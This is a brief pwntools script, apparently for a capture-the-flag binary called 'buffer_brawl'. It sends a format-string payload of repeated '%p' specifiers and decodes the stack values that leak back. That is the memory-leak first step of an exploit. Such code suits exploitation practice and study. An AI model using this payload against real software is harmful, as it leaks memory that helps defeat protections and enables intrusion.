from pwn import *
p = process('./buffer_brawl')
p.sendlineafter(b'> ', b'4')
p.recvuntil(b'Right or left?\n')
p.sendline(b"%p" * 14)
stack = p.recvline(keepends=False)
stack = [
    int(s, 16) for s in stack.replace(b"(nil)", b"0x0").replace(b"0x", b" ").split()
]
for i, s in enumerate(stack):
    print(f"{i+1}: {p64(s)} {hex(s)}")
    